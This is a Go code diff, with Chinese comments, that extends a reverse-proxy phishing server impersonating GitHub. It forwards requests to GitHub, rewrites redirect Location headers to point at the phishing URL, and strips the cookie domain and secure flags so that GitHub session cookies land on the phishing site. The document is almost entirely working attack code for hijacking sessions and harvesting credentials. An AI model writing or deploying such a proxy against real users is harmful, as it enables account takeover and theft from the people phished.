@@ -17,21 +17,29 @@ const (
 func handler(w http.ResponseWriter, r *http.Request) {
 	req := cloneRequest(r)
 	// 取得 body & header
-	body, header := sendReqToUpstream(req)
-
-	// 取代後的 body
+	body, header, statusCode := sendReqToUpstream(req)
 	body = replaceURLInResp(body, header)
-	w.Write(body)
 
 	// 用 range 把 header 中的 Set-Cookie 欄位全部複製給瀏覽器的 header
 	for _, v := range header["Set-Cookie"] {
 		// 把 domain=.github.com 移除
 		newValue := strings.Replace(v, "domain=.github.com;", "", -1)
-
 		// 把 secure 移除
 		newValue = strings.Replace(newValue, "secure;", "", 1)
-		w.Header().Add("Set-Cookie", v)
+
+		w.Header().Add("Set-Cookie", newValue)
 	}
+
+	// 如果 status code 是 3XX 就取代 Location 網址
+	if statusCode >= 300 && statusCode < 400 {
+		location := header.Get("Location")
+		newLocation := strings.Replace(location, upstreamURL, phishURL, -1)
+		w.Header().Set("Location", newLocation)
+	}
+
+	w.WriteHeader(statusCode)
+	// 取代後的 body
+	w.Write(body)
 }
 
 func cloneRequest(r *http.Request) *http.Request {
@@ -57,9 +65,14 @@ func cloneRequest(r *http.Request) *http.Request {
 	return req
 }
 
-func sendReqToUpstream(req *http.Request) ([]byte, http.Header) {
+func sendReqToUpstream(req *http.Request) ([]byte, http.Header, int) {
+	// 回傳 http.ErrUseLastResponse 這個錯誤他就不會跟隨 redirect 而是直接得到回覆
+	checkRedirect := func(r *http.Request, via []*http.Request) error {
+		return http.ErrUseLastResponse
+	}
+
 	// 建立 http client
-	client := http.Client{}
+	client := http.Client{CheckRedirect: checkRedirect}
 
 	// client.Do(req) 會發出請求到 Github、得到回覆 resp
 	resp, err := client.Do(req)
@@ -75,8 +88,8 @@ func sendReqToUpstream(req *http.Request) ([]byte, http.Header) {
 	// res.Body 讀取完，要記得 Close，不然會有 memory leak 等相關問題
 	resp.Body.Close()
 
-	// 回傳 body + header
-	return respBody, resp.Header
+	// 回傳 body + header + status
+	return respBody, resp.Header, resp.StatusCode
 }
 
 func replaceURLInResp(body []byte, header http.Header) []byte {
